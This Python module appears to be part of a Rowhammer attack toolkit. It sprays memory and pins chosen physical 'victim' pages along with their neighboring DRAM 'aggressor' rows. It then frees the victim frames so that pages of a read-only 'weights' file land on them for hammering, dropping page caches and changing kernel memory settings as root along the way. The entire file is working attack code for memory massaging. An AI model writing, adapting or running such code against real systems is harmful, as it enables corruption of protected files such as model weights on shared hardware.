"""Hold listed pages and neighbor rows; plant after evict."""

from __future__ import annotations

import ctypes
import mmap
import os
import struct
import sys
import time
from collections import defaultdict
from pathlib import Path

from pcp_reuse import (
    PAGE_SIZE,
    drain_pcp_on_buffer,
    fault_hunt_pages,
    hunt_base_addr,
)

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from framework.dram import from_pfn

BUILD = HERE / "build"
_PCP_LIB: ctypes.CDLL | None = None
MAX_HOLD_BYTES = 12 * 1024 * 1024 * 1024
RESERVE_HEADROOM = 32 * 1024 * 1024
MIN_SPRAY_PAGES = 1024
HUNT_MIN_FREE_KB = 4096
_LIBC: ctypes.CDLL | None = None
_KPF_NAMES = {
    5: "LRU",
    7: "SLAB",
    10: "BUDDY",
    11: "MMAP",
    12: "ANON",
    14: "SWAPBACKED",
    18: "UNEVICTABLE",
}


def load_pcp_lib() -> ctypes.CDLL:
    global _PCP_LIB
    if _PCP_LIB is not None:
        return _PCP_LIB
    path = BUILD / "libpcp_adapter.so"
    if not path.exists():
        raise SystemExit(f"missing {path}; run make -C eviction")
    lib = ctypes.CDLL(str(path), use_errno=True)
    lib.pcp_pin_cpu.argtypes = [ctypes.c_int]
    lib.pcp_pin_cpu.restype = ctypes.c_int
    lib.pcp_map_file_ro.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t)]
    lib.pcp_map_file_ro.restype = ctypes.c_void_p
    lib.pcp_unmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    lib.pcp_unmap.restype = ctypes.c_int
    lib.pcp_advise_random.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    lib.pcp_advise_random.restype = ctypes.c_int
    lib.pcp_fadvise_random.argtypes = [ctypes.c_char_p]
    lib.pcp_fadvise_random.restype = ctypes.c_int
    lib.pcp_release_and_reload.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_size_t,
    ]
    lib.pcp_release_and_reload.restype = ctypes.c_int
    lib.pcp_release_and_reload_n.argtypes = [
        ctypes.c_void_p,
        ctypes.POINTER(ctypes.c_size_t),
        ctypes.c_void_p,
        ctypes.POINTER(ctypes.c_size_t),
        ctypes.c_size_t,
        ctypes.c_size_t,
        ctypes.c_size_t,
    ]
    lib.pcp_release_and_reload_n.restype = ctypes.c_int
    _PCP_LIB = lib
    return lib


class HuntRegion:
    def __init__(self, buf, base: int, n: int, pfns: list[int]) -> None:
        self.buf = buf
        self.base = base
        self.n = n
        self.pfns = pfns


class OccupiedPages:
    """Victim pages to plant, plus neighbor/aggressor rows still held for hammer."""

    def __init__(
        self,
        regions: list[HuntRegion],
        slots: list[dict],
        neighbor_groups: list[dict],
        keep: set[tuple[int, int]],
    ) -> None:
        self.regions = regions
        self.buf = regions[0].buf if regions else None
        self.slots = slots
        self.neighbor_groups = neighbor_groups
        self.keep = keep
        self.hunt_n = regions[0].n if regions else 0

    def close(self) -> None:
        for region in self.regions:
            if region.buf is not None:
                region.buf.close()
                region.buf = None
        self.buf = None


def _meminfo_bytes(key: str) -> int:
    prefix = key + ":"
    try:
        with open("/proc/meminfo", encoding="utf-8") as fh:
            for line in fh:
                if line.startswith(prefix):
                    return int(line.split()[1]) * 1024
    except OSError:
        pass
    return 0


def _mem_available_bytes() -> int:
    return _meminfo_bytes("MemAvailable") or 4 * 1024 * 1024 * 1024


def _mem_free_bytes() -> int:
    return _meminfo_bytes("MemFree")


def _sysctl(path: str, value: str | None = None) -> str | None:
    p = Path(path)
    try:
        old = p.read_text().strip()
        if value is not None:
            p.write_text(value + "\n")
        return old
    except OSError:
        return None


def _explain_missing_pfns(pfns: list[int]) -> None:
    try:
        fh = open("/proc/kpageflags", "rb")
    except OSError:
        return
    with fh:
        for pfn in pfns:
            fh.seek(int(pfn) * 8)
            raw = fh.read(8)
            if len(raw) < 8:
                print(f"hold: missing {hex(int(pfn))} beyond max pfn")
                continue
            flags = struct.unpack("<Q", raw)[0]
            bits = [name for bit, name in _KPF_NAMES.items() if flags >> bit & 1]
            print(f"hold: missing {hex(int(pfn))} {'/'.join(bits) or hex(flags)}")


def _dontneed_unused(regions: list[HuntRegion], keep: set[tuple[int, int]]) -> int:
    released = 0
    for rid, region in enumerate(regions):
        if region.buf is None:
            continue
        i = 0
        n = region.n
        while i < n:
            if (rid, i) in keep:
                i += 1
                continue
            j = i + 1
            while j < n and (rid, j) not in keep:
                j += 1
            try:
                region.buf.madvise(
                    mmap.MADV_DONTNEED, i * PAGE_SIZE, (j - i) * PAGE_SIZE
                )
                released += j - i
            except OSError:
                pass
            i = j
    return released


def _drop_page_cache() -> bool:
    try:
        Path("/proc/sys/vm/drop_caches").write_text("3\n")
        return True
    except OSError:
        return False


def _libc() -> ctypes.CDLL:
    global _LIBC
    if _LIBC is None:
        lib = ctypes.CDLL("libc.so.6", use_errno=True)
        lib.mlock.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
        lib.mlock.restype = ctypes.c_int
        lib.munlock.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
        lib.munlock.restype = ctypes.c_int
        _LIBC = lib
    return _LIBC


def _mlock_region(base: int, nbytes: int) -> bool:
    return _libc().mlock(ctypes.c_void_p(base), ctypes.c_size_t(nbytes)) == 0


def _munlock_region(base: int, nbytes: int) -> bool:
    return _libc().munlock(ctypes.c_void_p(base), ctypes.c_size_t(nbytes)) == 0


def _add_region(n: int) -> HuntRegion:
    pages = int(n)
    last_err: Exception | None = None
    while pages >= MIN_SPRAY_PAGES:
        try:
            buf, pfns = fault_hunt_pages(pages)
        except (OSError, ValueError, mmap.error, MemoryError) as exc:
            last_err = exc
            pages //= 2
            continue
        if not any(pfns):
            buf.close()
            raise RuntimeError(
                "hold-buffer PFNs are 0; run the hold step with sudo so pagemap shows PFNs"
            )
        return HuntRegion(buf, hunt_base_addr(buf), pages, pfns)
    raise RuntimeError(f"cannot reserve hold pages: {last_err}")


def _index_pfns(region: HuntRegion, rid: int, by_pfn: dict[int, tuple[int, int, int]]) -> None:
    for idx, pfn in enumerate(region.pfns):
        if not pfn or pfn in by_pfn:
            continue
        by_pfn[pfn] = (rid, idx, region.base + idx * PAGE_SIZE)


def _index_rows_region(
    region: HuntRegion,
    rid: int,
    by_row: dict[tuple[int, int], tuple[int, int, int]],
) -> None:
    for idx, pfn in enumerate(region.pfns):
        if not pfn:
            continue
        dram = from_pfn(pfn)
        key = (dram.bank, dram.row)
        if key not in by_row:
            by_row[key] = (rid, idx, region.base + idx * PAGE_SIZE)


def _missing_neighbor_rows(
    wanted: list[int],
    by_row: dict[tuple[int, int], tuple[int, int, int]],
    aggressors: list[tuple[int, int, int]] | None,
    orig_victim_row: int | None,
) -> int:
    if not aggressors or orig_victim_row is None:
        return 0
    missing = 0
    for pfn in wanted:
        for _aid, bank, row in _needed_rows(pfn, aggressors, orig_victim_row):
            if (bank, row) not in by_row:
                missing += 1
    return missing


def _needed_rows(
    victim_pfn: int,
    aggressors: list[tuple[int, int, int]],
    orig_victim_row: int,
) -> list[tuple[int, int, int]]:
    """Aggressor (id, bank, row) for this victim, plus ±1 neighbors."""
    victim = from_pfn(victim_pfn)
    drow = int(victim.row) - int(orig_victim_row)
    need: list[tuple[int, int, int]] = []
    seen: set[tuple[int, int]] = set()
    for agg_id, _bank, row in aggressors:
        nr = int(row) + drow
        if nr < 0:
            continue
        key = (victim.bank, nr)
        if key in seen:
            continue
        seen.add(key)
        need.append((int(agg_id), victim.bank, nr))
    for delta, fake_id in ((-1, -1), (1, -2)):
        nr = int(victim.row) + delta
        if nr < 0:
            continue
        key = (victim.bank, nr)
        if key in seen:
            continue
        seen.add(key)
        need.append((fake_id, victim.bank, nr))
    return need


def _neighbor_row_keys(
    pfns: list[int],
    aggressors: list[tuple[int, int, int]] | None,
    orig_victim_row: int | None,
) -> set[tuple[int, int]]:
    keys: set[tuple[int, int]] = set()
    for pfn in pfns:
        victim = from_pfn(pfn)
        keys.add((victim.bank, victim.row - 1))
        keys.add((victim.bank, victim.row + 1))
        if aggressors and orig_victim_row is not None:
            for _aid, bank, row in _needed_rows(pfn, aggressors, orig_victim_row):
                keys.add((bank, row))
    return keys


def _close_empty_regions(regions: list[HuntRegion], keep: set[tuple[int, int]]) -> int:
    used = {rid for rid, _idx in keep}
    released = 0
    for rid, region in enumerate(regions):
        if rid in used or region.buf is None:
            continue
        released += region.n
        region.buf.close()
        region.buf = None
    return released


def occupy_listed(
    place_pages: list[int],
    wanted_pfns: list[int],
    *,
    hunt_pages: int,
    hunt_attempts: int = 16,
    pcp_cpu: int = 0,
    aggressors: list[tuple[int, int, int]] | None = None,
    orig_victim_row: int | None = None,
    access_ids: list[int] | None = None,
) -> OccupiedPages:
    """Before the victim starts: keep listed PFNs + neighbor rows, release the rest."""
    n = len(place_pages)
    wanted = [int(p) for p in wanted_pfns if int(p)][:n]
    if len(wanted) < n:
        raise RuntimeError(
            f"online_targets.json has {len(wanted)} PFNs for {n} place pages"
        )
    lib = load_pcp_lib()
    lib.pcp_pin_cpu(int(pcp_cpu))
    chunk = max(int(hunt_pages), n + 64)
    max_pages = MAX_HOLD_BYTES // PAGE_SIZE
    rounds = max(1, int(hunt_attempts))
    dropped = _drop_page_cache()
    old_min_free = _sysctl("/proc/sys/vm/min_free_kbytes", str(HUNT_MIN_FREE_KB))
    avail = _mem_available_bytes()
    win_lo, win_hi = min(wanted), max(wanted)
    regions: list[HuntRegion] = []
    by_pfn: dict[int, tuple[int, int, int]] = {}
    by_row: dict[tuple[int, int], tuple[int, int, int]] = {}
    rows_upto = 0
    print(
        f"hold: MemAvailable {avail / (1024**3):.1f} GiB MemFree "
        f"{_mem_free_bytes() / (1024**3):.1f} GiB drop_caches={int(dropped)} "
        f"window {hex(win_lo)}-{hex(win_hi)} ({(win_hi - win_lo + 1) * PAGE_SIZE / (1024**2):.0f} MiB)"
    )
    try:
        while rounds > 0:
            found_pfns = [pfn for pfn in wanted if pfn in by_pfn]
            if len(found_pfns) >= n:
                while rows_upto < len(regions):
                    _index_rows_region(regions[rows_upto], rows_upto, by_row)
                    rows_upto += 1
                need_keys = _neighbor_row_keys(found_pfns, aggressors, orig_victim_row)
                if need_keys <= by_row.keys():
                    break
            held_pages = sum(r.n for r in regions if r.buf is not None)
            if held_pages >= max_pages:
                break
            if not regions:
                room = max(0, _mem_available_bytes() - RESERVE_HEADROOM) // PAGE_SIZE
                take = min(room, max_pages)
            else:
                room = max(0, _mem_free_bytes() - RESERVE_HEADROOM) // PAGE_SIZE
                take = min(chunk, room, max_pages - held_pages)
            if take < MIN_SPRAY_PAGES:
                break
            rounds -= 1
            print(f"hold: spraying {take * PAGE_SIZE / (1024**2):.0f} MiB")
            try:
                regions.append(_add_region(take))
            except RuntimeError as exc:
                print(f"hold: spray stopped ({exc})")
                break
            _index_pfns(regions[-1], len(regions) - 1, by_pfn)
            found = sum(1 for pfn in wanted if pfn in by_pfn)
            in_win = sum(1 for pfn in regions[-1].pfns if win_lo <= pfn <= win_hi)
            print(
                f"hold: victims {found}/{n} after "
                f"{sum(r.n for r in regions) * PAGE_SIZE / (1024**2):.0f} MiB "
                f"window_pages={in_win} MemFree={_mem_free_bytes() / (1024**2):.0f} MiB"
            )

        selected = []
        missing = []
        for pfn in wanted:
            hit = by_pfn.get(pfn)
            if hit is None:
                missing.append(pfn)
            else:
                selected.append(hit + (pfn,))
        if not selected:
            for region in regions:
                if region.buf is not None:
                    region.buf.close()
            raise RuntimeError(f"found 0/{n} recorded pages in the hold buffer")
        if missing:
            print(f"hold: using {len(selected)}/{n} listed pages; missing {len(missing)}")
            _explain_missing_pfns(missing)

        found_pfns = [pfn for _rid, _idx, _va, pfn in selected]
        while rows_upto < len(regions):
            _index_rows_region(regions[rows_upto], rows_upto, by_row)
            rows_upto += 1

        pfn_to_page = {pfn: page for page, pfn in zip(place_pages, wanted)}
        slots = []
        keep: set[tuple[int, int]] = set()
        for rid, idx, va, pfn in selected:
            slots.append(
                {
                    "region": rid,
                    "index": idx,
                    "va": va,
                    "pfn": pfn,
                    "weight_page": int(pfn_to_page[pfn]),
                }
            )
            keep.add((rid, idx))

        neighbor_groups: list[dict] = []
        aggs = list(aggressors or [])
        access = list(access_ids or [])
        orig_row = orig_victim_row
        for pfn in found_pfns:
            id_to_va: dict[int, int] = {}
            if aggs and orig_row is not None:
                for agg_id, bank, row in _needed_rows(pfn, aggs, orig_row):
                    hit = by_row.get((bank, row))
                    if hit is None:
                        continue
                    rid, idx, va = hit
                    keep.add((rid, idx))
                    if agg_id > 0:
                        id_to_va[agg_id] = va
            access_vas = []
            if access and id_to_va and all(i in id_to_va for i in access):
                access_vas = [id_to_va[i] for i in access]
            elif id_to_va:
                access_vas = [id_to_va[k] for k in sorted(id_to_va)]
            if len(access_vas) < 2:
                victim = from_pfn(pfn)
                pair = []
                for delta in (-1, 1):
                    hit = by_row.get((victim.bank, victim.row + delta))
                    if hit is not None:
                        keep.add((hit[0], hit[1]))
                        pair.append(hit[2])
                access_vas = pair * 8 if len(pair) == 2 else pair
            neighbor_groups.append(
                {
                    "victim_pfn": pfn,
                    "access_vas": access_vas,
                    "aggressor_vas": id_to_va,
                }
            )

        held_groups = sum(1 for g in neighbor_groups if len(g["access_vas"]) >= 2)
        for rid, idx in keep:
            region = regions[rid]
            if region.buf is None:
                continue
            _mlock_region(region.base + idx * PAGE_SIZE, PAGE_SIZE)
        closed = _close_empty_regions(regions, keep)
        freed = _dontneed_unused(regions, keep)
        print(
            f"hold: keeping {len(keep)} pages "
            f"({len(slots)} victims + {len(keep) - len(slots)} neighbors), "
            f"{held_groups}/{len(slots)} with hammer VAs; "
            f"released {(closed + freed) * PAGE_SIZE / (1024**2):.0f} MiB; "
            f"MemAvailable {_mem_available_bytes() / (1024**3):.1f} GiB"
        )
        if held_groups < len(slots):
            print("hold: warning: some victims have no neighbor VAs in the spray")
        return OccupiedPages(regions, slots, neighbor_groups, keep)
    finally:
        if old_min_free is not None:
            _sysctl("/proc/sys/vm/min_free_kbytes", old_min_free)


def place_occupied(
    held: OccupiedPages,
    weights: Path,
    targets: list[int],
    *,
    pcp_cpu: int,
    drain_pages: int,
    cs_batch: int = 1,
) -> tuple[list[int], list[int], float, str]:
    """Release victim pages onto the file. Neighbor rows stay mapped."""
    n = len(targets)
    if not held.regions:
        raise RuntimeError("occupied buffer already closed")
    by_page = {int(s["weight_page"]): s for s in held.slots}
    selected = []
    missing = []
    for page in targets:
        slot = by_page.get(int(page))
        if slot is None:
            missing.append(int(page))
        else:
            selected.append(slot)
    if missing:
        raise RuntimeError(f"occupied set missing weight pages {missing[:8]}")
    lib = load_pcp_lib()
    lib.pcp_pin_cpu(int(pcp_cpu))
    length = ctypes.c_size_t(0)
    file_map = lib.pcp_map_file_ro(str(weights).encode(), ctypes.byref(length))
    if not file_map:
        raise RuntimeError(f"cannot map {weights}")
    try:
        lib.pcp_fadvise_random(str(weights).encode())
        lib.pcp_advise_random(ctypes.c_void_p(file_map), length.value)
        pairs = [
            (selected[i], int(targets[n - 1 - i]) * PAGE_SIZE) for i in range(n)
        ]
        grouped: dict[int, list[tuple[dict, int]]] = defaultdict(list)
        for slot, off in pairs:
            grouped[int(slot["region"])].append((slot, off))
        expected = [int(s["pfn"]) for s in selected]
        t0 = time.perf_counter()
        for slot in selected:
            _munlock_region(int(slot["va"]), PAGE_SIZE)
        for rid, group in grouped.items():
            region = held.regions[rid]
            if region.buf is None:
                raise RuntimeError(f"hold region {rid} was released")
            release_idx = [int(s["index"]) for s, _ in group]
            exclude = set(release_idx)
            exclude.update(idx for r, idx in held.keep if r == rid)
            if int(drain_pages) > 0 and region.n <= 8192:
                drain_pcp_on_buffer(
                    region.buf,
                    region.pfns,
                    zone="normal",
                    drain_pages=int(drain_pages),
                    exclude=exclude,
                )
            elif int(drain_pages) > 0:
                from pcp_reuse import scrub_attacker_pcp

                scrub_attacker_pcp(drain_pages=int(drain_pages), zone="normal")
            hunt_arr = (ctypes.c_size_t * len(group))(*release_idx)
            off_arr = (ctypes.c_size_t * len(group))(*[off for _, off in group])
            rc = lib.pcp_release_and_reload_n(
                ctypes.c_void_p(region.base),
                hunt_arr,
                ctypes.c_void_p(file_map),
                off_arr,
                ctypes.c_size_t(len(group)),
                ctypes.c_size_t(PAGE_SIZE),
                ctypes.c_size_t(cs_batch),
            )
            if rc != 0:
                raise RuntimeError(
                    f"pcp_release_and_reload_n rc={rc} errno={ctypes.get_errno()}"
                )
        place_ms = (time.perf_counter() - t0) * 1000.0
        from pcp_reuse import collect_pfns

        base = int(file_map)
        got = []
        matched = 0
        for page, exp in zip(targets, expected):
            pfns = collect_pfns(os.getpid(), base + int(page) * PAGE_SIZE, 1)
            have = int(pfns[0]) if pfns else 0
            got.append(have)
            matched += int(have != 0 and have == int(exp))
        mode = f"listed {matched}/{n} pfn-match"
        print(f"place {mode}")
        return expected, got, place_ms, mode
    finally:
        lib.pcp_unmap(ctypes.c_void_p(file_map), length)
